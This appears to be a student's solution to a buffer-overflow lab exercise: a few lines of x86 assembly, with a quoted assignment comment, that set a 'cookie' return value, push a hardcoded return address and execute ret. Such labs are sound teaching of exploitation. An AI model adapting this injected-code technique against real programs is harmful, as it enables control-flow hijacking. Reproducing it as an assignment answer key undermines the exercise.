/* Your exploit code should set your cookie as the return value, restore any corrupted state, push the correct return location on the stack, and execute a ret instruction to really return to test. */
push $0x08048c4d
push %ebp
mov %esp, %ebp
mov $0x7786e36c, %eax /* move cookie into %eax */
leave
ret
